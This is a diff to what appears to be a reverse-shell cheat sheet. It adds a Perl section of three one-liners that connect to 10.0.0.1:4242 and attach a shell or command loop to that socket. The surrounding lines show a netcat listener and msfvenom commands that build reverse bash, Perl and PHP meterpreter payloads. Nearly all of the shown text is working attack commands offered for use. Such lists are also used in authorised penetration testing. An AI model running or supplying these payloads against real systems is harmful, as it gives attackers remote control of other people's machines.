@@ -24,6 +24,18 @@ Listener:
 nc -u -lvp port
 ```
 
+## PERL
+
+```
+perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+NOTE: Windows only
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
+
 ## Python
 
 ### IPv4
@@ -134,4 +146,3 @@ $ msfvenom -p cmd/unix/reverse_bash LHOST="IP" LPORT=port -f raw > shell.sh
 $ msfvenom -p cmd/unix/reverse_perl LHOST="IP" LPORT=port -f raw > shell.pl
 $ msfvenom -p php/meterpreter_reverse_tcp LHOST="IP" LPORT=port -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
-
